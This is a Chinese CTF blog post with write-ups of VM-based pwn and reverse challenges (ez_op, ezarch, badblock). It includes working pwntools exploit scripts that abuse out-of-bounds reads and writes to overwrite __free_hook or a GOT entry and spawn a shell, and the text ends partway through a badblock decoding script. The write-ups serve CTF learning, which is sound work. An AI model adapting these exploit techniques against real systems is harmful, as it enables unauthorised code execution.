<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8"><meta name="X-UA-Compatible" content="IE=edge"><meta name="author" content="Q1IQ"><title>vm-Pwn · Q1IQ</title><meta name="description" content="ez_op题目分析首先根据入口点找到main函数，一般入口点就是IDA里Export窗口的start函数。

可以看到上面main函数的逻辑是：

使用mallocinfo函数为操作数分配空间，为操作码分配空间。



读入操作码至buf中，并将其转换成整数形式保存在opcode中；操作数同理保存在"><meta name="keywords"><meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"><meta content="yes" name="apple-mobile-web-app-capable"><meta content="black" name="apple-mobile-web-app-status-bar-style"><meta content="telephone=no" name="format-detection"><meta name="renderer" content="webkit"><link rel="short icon" href="/images/favicon.png" type="image/x-icon"><link rel="stylesheet" href="/css/style.css"><link rel="stylesheet" href="/css/blog_basic.css"><link rel="stylesheet" href="/css/font-awesome.min.css"><link rel="alternate" type="application/atom+xml" title="ATOM 1.0" href="/atom.xml"></head><body><div class="sidebar animated fadeInDown"><div class="logo-title"><div class="title"><img src="/images/logo@2x.png" style="width:127px;"><h3 title=""><a href="/">Q1IQ</a></h3><div class="description"><p>北京邮电大学 天枢Dubhe</p></div></div></div><ul class="social-links"></ul><script async="" src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="footer"><a target="_blank" href="/"><span id="busuanzi_container_site_pv"></span><i class="fa fa-eye"></i>访问量<span id="busuanzi_value_site_pv"></span>次 |  <span id="busuanzi_container_site_uv"></span><i class="fa fa-user-md"></i>访客数<span id="busuanzi_value_site_uv"></span>人</a></div></div><div class="main"><div class="page-top animated fadeInDown"><div class="nav"><li><a href="/">Home</a></li><li><a href="/archives">Arquivo</a></li><li><a href="/links">Links</a></li></div><div class="information"><div class="back_btn"><li><a class="fa fa-chevron-left" onclick="window.history.go(-1)"> </a></li></div><div class="avatar"><img></div></div></div><div class="autopagerize_page_element"><div class="content"><div class="post-page"><div class="post animated fadeInDown"><div class="post-title"><h3><a>vm-Pwn</a></h3></div><div class="post-content"><h1 id="ez-op"><a href="#ez-op" class="headerlink" title="ez_op"></a>ez_op</h1><h3 id="题目分析"><a href="#题目分析" class="headerlink" title="题目分析"></a>题目分析</h3><p>首先根据入口点找到main函数，一般入口点就是IDA里Export窗口的start函数。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203015656.png" alt=""></p>
<p>可以看到上面main函数的逻辑是：</p>
<ol>
<li>使用mallocinfo函数为操作数分配空间，为操作码分配空间。</li>
</ol>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203112340.png" alt=""></p>
<ol start="2">
<li>读入操作码至buf中，并将其转换成整数形式保存在opcode中；操作数同理保存在oprand中</li>
<li>进入大循环loop函数，就是本题的虚拟机，后面详细讲解。</li>
<li>使用freeinfo函数释放分配的空间</li>
</ol>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203113657.png" alt=""></p>
<p>loop函数就是虚拟机，主要逻辑是一个大循环，每次循环完成一个操作码对应的功能。那么怎么知道每个操作码对应什么功能呢，我觉得对我来说只能慢慢逆向+猜吧。这个题目的功能有save、load、push、pop、加减乘除，最后逆出来的效果就是下面这样：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203021255.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203021416.png" alt=""></p>
<p>漏洞点在于load和save都没有检查是否越界，所以可以任意地址读写。</p>
<p>首先看load。</p>
<ul>
<li><p>分开来看。我给虚拟机的栈起名叫做vstack，真实的栈叫stack。heappop2stack函数的功能是：从第一个参数中pop出一个值并将其赋值给第二个参数，这个第二个参数是一个栈变量。stack2heap函数的功能是：将第二个参数的值push进第一个参数。</p>
</li>
<li><p>整体的逻辑就是从vstack中pop一个偏移，然后push vstack[偏移]到vstack栈顶。</p>
</li>
</ul>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203021624.png" alt=""></p>
<p>save函数同理，整体的逻辑是从vstack中pop一个偏移，再从vstack中pop一个值，最后将这个值赋给vstack[偏移]。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203022522.png" alt=""></p>
<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>利用方法就是通过任意地址读写改freehook为system，然后构造system(“/bin/sh”)。需要注意的是vstack的调用顺序。</p>
<p>具体构造如下：</p>
<ol>
<li>因为heap地址会随机化，所以不能直接通过偏移获取freehook的地址，但是可以通过相对地址获取。可以看到vstack-&gt;addr[69]处就是vstack-&gt;addr，所以可以<code>load</code>这个地址；然后和freehook进行相减<code>sub</code>，此处需要注意的是减数靠近栈底，被减数靠近栈顶，因为freehook比heap地址低，所以可以将freehook设为被减数，相减后得到一个负数；再将这个负数除<code>div</code>4就可以获得偏移，同样需要注意除数和被除数的关系，需要提前将4放进栈中。</li>
</ol>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200203114548.png" alt=""></p>
<ol start="2">
<li>使用<code>save</code>将system的地址存放到freehook中去，在vstack-&gt;addr中构造’/bin/sh’。退出循环后freeinfo函数中调用了free(vstack-&gt;addr)，可以触发system(‘/bin/sh’)。</li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	io = process(<span class="string">'./ez_op.dms'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">"112.126.101.96"</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ez_op.dms'</span>)</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line">load = <span class="number">-1</span></span><br><span class="line">save = <span class="number">0x10101010</span></span><br><span class="line">push = <span class="number">0x2A3D</span></span><br><span class="line">pop  = <span class="number">0xFFFF28</span></span><br><span class="line">add  = <span class="number">0x0</span></span><br><span class="line">sub  = <span class="number">0x11111</span></span><br><span class="line">mul  = <span class="number">0xABCEF</span></span><br><span class="line">div  = <span class="number">0x514</span></span><br><span class="line"></span><br><span class="line">freeh=<span class="number">0x080E09F0</span> </span><br><span class="line">system=<span class="number">0x08051C60</span></span><br><span class="line">bin_sh=<span class="number">0x080B088F</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">app</span><span class="params">(op)</span>:</span></span><br><span class="line">	<span class="keyword">global</span> c</span><br><span class="line">	c+=<span class="string">" "</span></span><br><span class="line">	c+=str(op)</span><br><span class="line"><span class="comment">#gdb.attach(io,"b *0x0804A127")</span></span><br><span class="line"><span class="comment">#opcode</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">app(push)</span><br><span class="line">app(push)</span><br><span class="line">app(push)</span><br><span class="line">app(load)</span><br><span class="line">app(push)</span><br><span class="line">app(sub)</span><br><span class="line">app(div)</span><br><span class="line">app(push)</span><br><span class="line">app(add)</span><br><span class="line">app(save)</span><br><span class="line">app(push)</span><br><span class="line">app(push)</span><br><span class="line">io.sendline(c)</span><br><span class="line"><span class="comment">#oprand</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">app(system)</span><br><span class="line">app(<span class="number">4</span>) </span><br><span class="line">app(<span class="number">67</span>) </span><br><span class="line">app(freeh) </span><br><span class="line">app(<span class="number">1</span>)</span><br><span class="line">app(<span class="number">0x6e69622f</span>)</span><br><span class="line">app(<span class="number">0x0068732f</span>)</span><br><span class="line">io.sendline(c)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>exp中为什么load堆地址时用67而非69呢，是因为在load前已经push了两个值，所以偏移为69-2=67。</p>
<h1 id="ezarch"><a href="#ezarch" class="headerlink" title="ezarch"></a>ezarch</h1><h3 id="题目分析-1"><a href="#题目分析-1" class="headerlink" title="题目分析"></a>题目分析</h3><h4 id="汇编指令结构"><a href="#汇编指令结构" class="headerlink" title="汇编指令结构"></a>汇编指令结构</h4><p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200205192324.png" alt=""></p>
<p>其中，</p>
<h5 id="type"><a href="#type" class="headerlink" title="type"></a>type</h5><p>0 r0-14 </p>
<p>00 r0-14 16 esp 17 ebp</p>
<p>1 立即数</p>
<p>2 [CS+r0-14]    </p>
<p>22 [CS+r0-14 16 esp 17 ebp ]    </p>
<h5 id="opcode"><a href="#opcode" class="headerlink" title="opcode"></a>opcode</h5><table>
<thead>
<tr>
<th></th>
<th>简称</th>
<th></th>
<th>oprand1寻址方式</th>
<th>oprand2寻址方式</th>
</tr>
</thead>
<tbody><tr>
<td>2</td>
<td>sub</td>
<td>oprand1 -= oprand2</td>
<td>02</td>
<td>012</td>
</tr>
<tr>
<td>3</td>
<td>mov</td>
<td>oprand1&lt;–mov–oprand2</td>
<td>0022</td>
<td>00122</td>
</tr>
</tbody></table>
<p>一共0x11个指令，但是用这2个居然就能做出题来。</p>
<h4 id="内存结构"><a href="#内存结构" class="headerlink" title="内存结构"></a>内存结构</h4><p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200206212041.png" alt=""></p>
<p>mem在<code>0x2030c0</code>，<code>0x202078</code>处有一个指向mem的指针。其中memory是malloc来的，stack在<code>bss</code>段<code>0x2020c0</code>。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200206181936.png" alt=""></p>
<h3 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h3><p>进入大循环的时候会检验三个条件：<code>esp&lt;4096</code>,<code>ebp&gt;memorysize</code>,<code>eip&gt;memorysize</code>，但是这个<code>memorysize</code>是可以设置的，所以可以用<code>ebp</code>越界存取数据。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200206212505.png" alt=""></p>
<h3 id="漏洞利用-1"><a href="#漏洞利用-1" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>先把<code>mem-&gt;stack</code> <code>mov</code>到<code>memory</code>上，再<code>sub</code> <code>0xc0-0x18</code> 就是<code>free</code>的<code>got</code>表地址<code>0x00202018</code>，再把它<code>mov</code>到<code>mem-&gt;stack</code>，这样<code>mem-&gt;stack</code>就在<code>got</code>表上了。</p>
<p>改<code>ebp</code>为8，因为<code>free+8</code>是<code>puts</code>，这时候<code>free</code>还没被用过，<code>puts</code>被用过。把<code>puts</code> <code>mov</code>到<code>memory</code>上，再<code>sub libc[&#39;puts&#39;]-onegadget</code>，再把它<code>mov</code>回<code>got</code>表里，<code>puts</code>就被改成<code>onegadget</code>了。</p>
<p>exp有更详细的分步注释：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">debug=<span class="number">1</span></span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">	io = process(<span class="string">'./ezarch'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">	io = remote(<span class="string">"112.126.101.96"</span>,<span class="number">9999</span>)</span><br><span class="line">elf = ELF(<span class="string">'./ezarch'</span>)</span><br><span class="line"><span class="comment">#libc=libc('./libc.so')</span></span><br><span class="line"><span class="comment">#gadgets=[324293,324386,1090444]</span></span><br><span class="line">libc=ELF(<span class="string">'/lib/x86_64-linux-gnu/libc.so.6'</span>)</span><br><span class="line">gadgets=[<span class="number">283158</span>, <span class="number">283242</span>, <span class="number">983716</span>, <span class="number">987463</span>]</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :io.send(str(data)) </span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :io.sendafter(str(delim), str(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :io.sendline(str(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :io.sendlineafter(str(delim), str(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> numb=<span class="number">4096</span>          :io.recv(numb)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :io.recvuntil(delims, drop)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">memory</span><span class="params">(size,init,content,eip,esp,ebp)</span>:</span></span><br><span class="line">	ru(<span class="string">'&gt;'</span>)</span><br><span class="line">	sl(<span class="string">'M'</span>)</span><br><span class="line">	ru(<span class="string">'[*]Memory size&gt;'</span>)</span><br><span class="line">	sl(size)</span><br><span class="line">	ru(<span class="string">'[*]Inited size&gt;'</span>)</span><br><span class="line">	sl(init)</span><br><span class="line">	ru(<span class="string">'[*]Input Memory Now '</span>)</span><br><span class="line">	sl(content)</span><br><span class="line">	ru(<span class="string">'eip&gt;'</span>) <span class="comment">#eip&lt;memory size</span></span><br><span class="line">	sl(eip)</span><br><span class="line">	ru(<span class="string">'esp&gt;'</span>) <span class="comment">#esp&lt;stack size 0x1000</span></span><br><span class="line">	sl(eip)</span><br><span class="line">	ru(<span class="string">'ebp&gt;'</span>) <span class="comment">#ebp&lt;memory size</span></span><br><span class="line">	sl(ebp)</span><br><span class="line"></span><br><span class="line">op=<span class="keyword">lambda</span> opcode,type1,type2,oprand1,oprand2 : bytes.decode(flat(p8(opcode),p8(type1+type2*<span class="number">0x10</span>),p32(oprand1),p32(oprand2)),<span class="string">"unicode-escape"</span>)</span><br><span class="line"><span class="comment">#mov mem-&gt;stack 2 got</span></span><br><span class="line">c=<span class="string">''</span></span><br><span class="line">c+=op(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">17</span>)  <span class="comment">#mov mem-&gt;stack+ebp to memory+r1</span></span><br><span class="line">c+=op(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="number">0xc0</span><span class="number">-0x18</span>)  <span class="comment">#sub memory+r1 0xc0-0x18</span></span><br><span class="line">c+=op(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">1</span>) <span class="comment">#mov memory+r1 to mem-&gt;stack+ebp </span></span><br><span class="line"></span><br><span class="line"><span class="comment">#change got['puts'] onegadget</span></span><br><span class="line">c+=op(<span class="number">3</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">17</span>,<span class="number">8</span>) <span class="comment">#ebp=8</span></span><br><span class="line">c+=op(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">17</span>) <span class="comment">#mov mem-&gt;stack+ebp to memory+r1</span></span><br><span class="line">c+=op(<span class="number">2</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">1</span>,libc.symbols[<span class="string">'puts'</span>]-gadgets[<span class="number">0</span>])  <span class="comment">#sub memory+r1 libc.symbols['puts']-gadgets[0]</span></span><br><span class="line">c+=op(<span class="number">3</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">17</span>,<span class="number">1</span>) <span class="comment">#mov memory+r1 to mem-&gt;stack+ebp </span></span><br><span class="line">memory(<span class="number">0x2000</span>,len(c),c,<span class="number">0</span>,<span class="number">0x900</span>,<span class="number">0x1008</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#getshell</span></span><br><span class="line">ru(<span class="string">'&gt;'</span>)</span><br><span class="line">sl(<span class="string">'R'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200206211637.png" alt=""></p>
<h1 id="badblock"><a href="#badblock" class="headerlink" title="badblock"></a>badblock</h1><p>这个题是一个vm的<strong>逆向</strong>题，运行题目可以输入一个字符串。困住我的是这个题最后想让我达成什么目标呢，逆的时候也想不明白，逆完vm了就自然而然知道了。</p>
<p>指令串是放在数据段里的，分析完vm后可以知道指令串的功能是将输入经过运算后，和一个放在数据段里的数据进行比较。如果你输入的是flag，那么经过运算后的结果将会和数据段里的相同。</p>
<p>有几个反调试的机制，为了能调试可以直接nop掉。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200317154255.png" alt=""></p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200317154336.png" alt=""></p>
<p>在数据段里有函数表：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200322235245.png" alt=""></p>
<p>函数类似这样：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200323005550.png" alt=""></p>
<p>大循环长这样：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200323005625.png" alt=""></p>
<p>这个not_equal函数是比较两个值，如果不相等的话就将skip位置2，相等置1。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200323000852.png" alt=""></p>
<p>跳转的时候会将op-&gt;flag1置为1或2，在大循环里有这样一条逻辑，表示说是相等跳转还是不相等跳转。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200323001215.png" alt=""></p>
<p>逆出来的结构体如下：</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200323010421.png" alt=""></p>
<p>所有指令翻译完就是这样了，是先让[9]=0+1+…+8=36，再二十轮的data1[i]^((i+36)*2)。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200322235132.png" alt=""></p>
<p>除此之外程序还对输入进行了异或运算，动态调试+偷偷看wp就可以看出逻辑是每个字符都要和它往前数第四个字符异或一下。</p>
<p><img src="https://qiiq-1258887625.cos.ap-chengdu.myqcloud.com/20200322235640.png" alt=""></p>
<p>脚本如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line">data1=[<span class="number">0x2E</span>, <span class="number">0x00</span>, <span class="number">0x26</span>, <span class="number">0x00</span>, <span class="number">0x2D</span>, <span class="number">0x00</span>, <span class="number">0x29</span>, <span class="number">0x00</span>, <span class="number">0x4D</span>, <span class="number">0x00</span>, </span><br><span class="line">       <span class="number">0x67</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x44</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x0E</span>, <span class="number">0x00</span>, </span><br><span class="line">       <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x7F</span>, <span class="number">0x00</span>, <span class="number">0x7D</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x00</span>, <span class="number">0x77</span>, <span class="number">0x00</span>, </span><br><span class="line">       <span class="number">0x24</span>, <span class="number">0x00</span>, <span class="number">0x1A</span>, <span class="number">0x00</span>, <span class="number">0x5D</span>, <span class="number">0x00</span>, <span class="number">0x33</span>, <span class="number">0x00</span>, <span class="number">0x51</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">opcodes=[ <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x07</span>, <span class="number">0x00</span>, <span class="number">0x08</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0xFC</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x0A</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x0C</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x00</span>, <span class="number">0x0B</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x03</span>, <span class="number">0x00</span>, <span class="number">0x06</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x01</span>, <span class="number">0xF5</span>, <span class="number">0xFF</span>, </span><br><span class="line">          <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0xFF</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x09</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, </span><br><span class="line">          <span class="number">0xFF</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, ]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">op=&#123;</span><br><span class="line">  <span class="string">"1"</span>:<span class="string">"add             "</span>,</span><br><span class="line">  <span class="string">"2"</span>:<span class="string">"sub             "</span>,</span><br><span class="line">  <span class="string">"3"</span>:<span class="string">"not_equal       "</span>,</span><br><span class="line">  <span class="string">"4"</span>:<span class="string">"jmp_offset      "</span>,</span><br><span class="line">  <span class="string">"5"</span>:<span class="string">"mov_data_2_data "</span>,</span><br><span class="line">  <span class="string">"6"</span>:<span class="string">"mov_eip_2_data  "</span>,</span><br><span class="line">  <span class="string">"7"</span>:<span class="string">"mov_data_2_eip  "</span>,</span><br><span class="line">  <span class="string">"8"</span>:<span class="string">"mov_opr2_2_data "</span>,</span><br><span class="line">  <span class="string">"9"</span>:<span class="string">"is0_err         "</span>,</span><br><span class="line">  <span class="string">"10"</span>:<span class="string">"mov_input_2_data"</span>,</span><br><span class="line">  <span class="string">"11"</span>:<span class="string">"mov_data1_2_data"</span>,</span><br><span class="line">  <span class="string">"12"</span>:<span class="string">"xor             "</span>,</span><br><span class="line">  <span class="string">"13"</span>:<span class="string">"isnot0          "</span>,</span><br><span class="line">  <span class="string">"14"</span>:<span class="string">"loop            "</span>,</span><br><span class="line">  <span class="string">"255"</span>:<span class="string">"exit            "</span></span><br><span 